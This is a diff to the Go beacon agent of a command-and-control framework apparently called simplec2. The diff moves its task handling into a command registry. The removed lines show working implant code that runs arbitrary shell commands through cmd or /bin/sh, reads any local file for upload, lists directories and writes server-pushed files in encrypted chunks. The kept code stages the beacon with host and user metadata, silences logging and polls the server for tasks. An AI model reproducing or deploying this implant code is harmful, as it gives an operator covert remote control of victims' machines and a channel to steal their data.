@@ -17,24 +17,21 @@ import (
 	"net"
 	"net/http"
 	"os"
-	"os/exec"
 	"os/user"
-	"path/filepath"
 	"runtime"
-	"strconv"
 	"time"
+
+	"simplec2/agents/http/command"
 )
 
 //go:embed listener.pub
 var listenerPublicKey []byte
 
 var (
-	serverURL     string // To be set at build time via -ldflags
-	beaconID      string
-	sessionID     string
-	sessionKey    []byte
-	sleepInterval = 5 * time.Second
-	jitter        = 2 * time.Second
+	serverURL  string // To be set at build time via -ldflags
+	beaconID   string
+	sessionID  string
+	sessionKey []byte
 )
 
 // --- Silent Mode Support ---
@@ -47,41 +44,6 @@ func init() {
 		// Disable all log output by setting output to io.Discard
 		log.SetOutput(io.Discard)
 	}
-}
-
-// --- Structs for JSON marshaling ---
-
-type BeaconMetadata struct {
-	PID           int    `json:"pid"`
-	OS            string `json:"os"`
-	Arch          string `json:"arch"`
-	Username      string `json:"username"`
-	Hostname      string `json:"hostname"`
-	InternalIP    string `json:"internal_ip"`
-	ProcessName   string `json:"process_name"`
-	IsHighIntegrity bool   `json:"is_high_integrity"`
-}
-
-type StagingResponse struct {
-	AssignedBeaconID string `json:"assigned_beacon_id"`
-}
-
-type Task struct {
-	TaskID    string `json:"task_id"`
-	CommandID uint32 `json:"command_id"`
-	Arguments []byte `json:"arguments"`
-}
-
-type CheckInResponse struct {
-	Tasks    []*Task `json:"tasks"`
-	NewSleep int32   `json:"new_sleep"`
-}
-
-type FileInfo struct {
-	Name        string `json:"name"`
-	IsDir       bool   `json:"is_dir"`
-	Size        int64  `json:"size"`
-	LastModTime string `json:"last_mod_time"`
 }
 
 // --- Main Logic ---
@@ -103,6 +65,9 @@ func main() {
 	}
 	log.Printf("Staged successfully, got BeaconID: %s", beaconID)
 
+	// 初始化文件下载器依赖注入
+	command.SetChunkDownloader(&beaconChunkDownloader{})
+
 	checkInLoop()
 }
 
@@ -111,7 +76,7 @@ func main() {
 func checkInLoop() {
 	log.Println("Entering check-in loop...")
 	for {
-		time.Sleep(sleepInterval)
+		time.Sleep(command.SleepInterval)
 		log.Printf("Checking in for tasks (interval: %s)...")
 
 		checkinReqMap := map[string]string{"beacon_id": beaconID}
@@ -150,24 +115,18 @@ func processTasks(tasks []*Task) {
 		var output []byte
 		var err error
 
-		switch task.CommandID {
-		case 1: // Shell
-			output, err = handleShellTask(task)
-		case 2: // Download
-			err = handleDownloadTask(task)
-			if err == nil {
-				output = []byte("File downloaded successfully.")
-			}
-		case 3: // Upload
-			output, err = handleUploadTask(task)
-		case 4: // Exit
-			handleExitTask()
-		case 5: // Sleep
-			output, err = handleSleepTask(task)
-		case 6: // Browse
-			output, err = handleBrowseTask(task)
-		default:
+		// 使用命令注册表分发
+		cmdTask := &command.Task{
+			TaskID:    task.TaskID,
+			CommandID: task.CommandID,
+			Arguments: task.Arguments,
+		}
+
+		handler, ok := command.Get(task.CommandID)
+		if !ok {
 			err = fmt.Errorf("unknown command ID: %d", task.CommandID)
+		} else {
+			output, err = handler.Execute(cmdTask)
 		}
 
 		if err != nil {
@@ -179,59 +138,34 @@ func processTasks(tasks []*Task) {
 	}
 }
 
-// --- Task Handlers ---
+// --- ChunkDownloader Implementation ---
 
-func handleShellTask(task *Task) ([]byte, error) {
-	return executeShellCommand(string(task.Arguments))
-}
+// beaconChunkDownloader 实现 command.ChunkDownloader 接口
+type beaconChunkDownloader struct{}
 
-func handleUploadTask(task *Task) ([]byte, error) {
-	sourcePath := string(task.Arguments)
-	log.Printf("Reading file from %s to upload", sourcePath)
-	return os.ReadFile(sourcePath)
-}
-
-func handleExitTask() {
-	log.Println("Received exit command. Terminating.")
-	os.Exit(0)
-}
-
-func handleSleepTask(task *Task) ([]byte, error) {
-	var newSleep int32
-	// 调试：打印原始参数
-	log.Printf("Sleep task received. TaskID: %s, Arguments length: %d, Arguments raw: %q", task.TaskID, len(task.Arguments), string(task.Arguments))
-
-	if len(task.Arguments) == 0 {
-		return nil, fmt.Errorf("empty sleep arguments")
+func (d *beaconChunkDownloader) DownloadChunk(taskID string, chunkNumber int64) ([]byte, error) {
+	chunkReqMap := map[string]interface{}{
+		"task_id":      taskID,
+		"chunk_number": chunkNumber,
 	}
-	// 尝试解析为JSON数字或字符串
-	var sleepValue interface{}
-	if err := json.Unmarshal(task.Arguments, &sleepValue); err != nil {
-		return nil, fmt.Errorf("invalid JSON: %v", err)
+	chunkReqBody, _ := json.Marshal(chunkReqMap)
+
+	encryptedReq, err := encrypt(chunkReqBody)
+	if err != nil {
+		return nil, fmt.Errorf("failed to encrypt chunk request for chunk %d: %v", chunkNumber, err)
 	}
 
-	// 处理数字或字符串格式
-	switch v := sleepValue.(type) {
-	case float64: // JSON数字: 30
-		newSleep = int32(v)
-	case string: // JSON字符串: "30"
-		parsed, err := parseInt32(v)
-		if err != nil {
-			return nil, fmt.Errorf("invalid sleep value: %s", v)
-		}
-		newSleep = parsed
-	default:
-		return nil, fmt.Errorf("unsupported sleep argument type: %T", v)
+	encryptedChunkData, err := doPostAndGetRaw(serverURL+"/chunk", encryptedReq)
+	if err != nil {
+		return nil, fmt.Errorf("failed to download chunk %d: %v", chunkNumber, err)
 	}
 
-	// 验证范围
-	if newSleep < 1 || newSleep > 3600 {
-		return nil, fmt.Errorf("sleep value must be between 1 and 3600 seconds, got %d", newSleep)
+	chunkData, err := decrypt(encryptedChunkData)
+	if err != nil {
+		return nil, fmt.Errorf("failed to decrypt chunk %d: %v", chunkNumber, err)
 	}
 
-	sleepInterval = time.Duration(newSleep) * time.Second
-	log.Printf("Updated check-in interval to %s", sleepInterval)
-	return []byte(fmt.Sprintf("Sleep interval set to %d seconds", newSleep)), nil
+	return chunkData, nil
 }
 
 func pushTaskOutput(taskID string, output []byte) {
@@ -262,13 +196,13 @@ func pushTaskOutput(taskID string, output []byte) {
 func stageBeacon() error {
 	hostname, _ := os.Hostname()
 	metadata := BeaconMetadata{
-		PID:           os.Getpid(),
-		OS:            runtime.GOOS,
-		Arch:          runtime.GOARCH,
-		Username:      getUsername(),
-		Hostname:      hostname,
-		InternalIP:    getInternalIP(),
-		ProcessName:   os.Args[0],
+		PID:             os.Getpid(),
+		OS:              runtime.GOOS,
+		Arch:            runtime.GOARCH,
+		Username:        getUsername(),
+		Hostname:        hostname,
+		InternalIP:      getInternalIP(),
+		ProcessName:     os.Args[0],
 		IsHighIntegrity: false, // Simplified
 	}
 
@@ -450,130 +384,6 @@ func getInternalIP() string {
 	return "127.0.0.1"
 }
 
-func executeShellCommand(command string) ([]byte, error) {
-	var cmd *exec.Cmd
-	if runtime.GOOS == "windows" {
-		cmd = exec.Command("cmd", "/C", command)
-	} else {
-		cmd = exec.Command("/bin/sh", "-c", command)
-	}
-	return cmd.CombinedOutput()
-}
-
-func handleDownloadTask(task *Task) error {
-	// 1. Parse metadata from arguments
-	var args struct {
-		Source      string `json:"source"`
-		Destination string `json:"destination"`
-		FileSize    int64  `json:"file_size"`
-		ChunkSize   int    `json:"chunk_size"`
-	}
-	if err := json.Unmarshal(task.Arguments, &args); err != nil {
-		return fmt.Errorf("could not unmarshal download metadata: %v", err)
-	}
-
-	if args.ChunkSize == 0 {
-		return fmt.Errorf("chunk size cannot be zero")
-	}
-
-	// 2. Create temporary file
-	tempFilePath := args.Destination + ".tmp"
-	destFile, err := os.Create(tempFilePath)
-	if err != nil {
-		return fmt.Errorf("could not create temporary file %s: %v", tempFilePath, err)
-	}
-	defer destFile.Close()
-
-	// 3. Calculate total chunks and loop
-	totalChunks := (args.FileSize + int64(args.ChunkSize) - 1) / int64(args.ChunkSize)
-	log.Printf("Starting download of %s to %s. Total size: %d bytes, Chunks: %d", args.Source, args.Destination, args.FileSize, totalChunks)
-
-	for i := int64(0); i < totalChunks; i++ {
-		// 4. Request chunk from listener
-		chunkReqMap := map[string]interface{}{
-			"task_id":      task.TaskID,
-			"chunk_number": i,
-		}
-		chunkReqBody, _ := json.Marshal(chunkReqMap)
-
-		encryptedReq, err := encrypt(chunkReqBody)
-		if err != nil {
-			os.Remove(tempFilePath) // Cleanup
-			return fmt.Errorf("failed to encrypt chunk request for chunk %d: %v", i, err)
-		}
-
-		// The raw chunk data is returned encrypted, so we must decrypt it
-		encryptedChunkData, err := doPostAndGetRaw(serverURL+"/chunk", encryptedReq)
-		if err != nil {
-			os.Remove(tempFilePath) // Cleanup
-			return fmt.Errorf("failed to download chunk %d: %v", i, err)
-		}
-
-		chunkData, err := decrypt(encryptedChunkData)
-		if err != nil {
-			os.Remove(tempFilePath) // Cleanup
-			return fmt.Errorf("failed to decrypt chunk %d: %v", i, err)
-		}
-
-		// 5. Write chunk to file
-		if _, err := destFile.Write(chunkData); err != nil {
-			os.Remove(tempFilePath) // Cleanup
-			return fmt.Errorf("failed to write chunk %d to temporary file: %v", i, err)
-		}
-		log.Printf("Downloaded and wrote chunk %d/%d", i+1, totalChunks)
-	}
-
-	// 6. Rename file
-	if err := os.Rename(tempFilePath, args.Destination); err != nil {
-		os.Remove(tempFilePath) // Cleanup
-		return fmt.Errorf("failed to rename temporary file to %s: %v", args.Destination, err)
-	}
-
-	log.Printf("Successfully downloaded file to %s", args.Destination)
-	return nil
-}
-
-
-func handleBrowseTask(task *Task) ([]byte, error) {
-	dirPath := string(task.Arguments)
-	log.Printf("Browsing directory: %s", dirPath)
-
-	absoluteDirPath, err := filepath.Abs(dirPath)
-	if err != nil {
-		return nil, fmt.Errorf("failed to resolve absolute path for %s: %v", dirPath, err)
-	}
-
-	entries, err := os.ReadDir(absoluteDirPath)
-	if err != nil {
-		log.Printf("Error reading directory %s: %v", absoluteDirPath, err)
-		jsonOutput, _ := json.Marshal([]FileInfo{})
-		return []byte(absoluteDirPath + "\n" + string(jsonOutput)), nil
-	}
-
-	files := make([]FileInfo, 0)
-	for _, entry := range entries {
-		info, err := entry.Info()
-		if err != nil {
-			log.Printf("Warning: failed to get info for %s: %v", entry.Name(), err)
-			continue
-		}
-		files = append(files, FileInfo{
-			Name:        info.Name(),
-			IsDir:       info.IsDir(),
-			Size:        info.Size(),
-			LastModTime: info.ModTime().Format(time.RFC3339),
-		})
-	}
-
-	jsonOutput, err := json.Marshal(files)
-	if err != nil {
-		log.Printf("Error marshaling file info to JSON for %s: %v", dirPath, err)
-		jsonOutput = []byte("[]")
-	}
-
-	return []byte(absoluteDirPath + "\n" + string(jsonOutput)), nil
-}
-
 // doPostAndGetRaw is a variant of doPost that returns the raw (but still encrypted) response body,
 // without trying to decrypt it. This is needed for downloading file chunks.
 func doPostAndGetRaw(url string, body []byte) ([]byte, error) {
@@ -593,15 +403,4 @@ func doPostAndGetRaw(url string, body []byte) ([]byte, error) {
 	}
 
 	return io.ReadAll(resp.Body)
-}
-
-
-// parseInt32 解析字符串为int32
-func parseInt32(s string) (int32, error) {
-	var result int64
-	var err error
-	if result, err = strconv.ParseInt(s, 10, 32); err != nil {
-		return 0, err
-	}
-	return int32(result), nil
 }
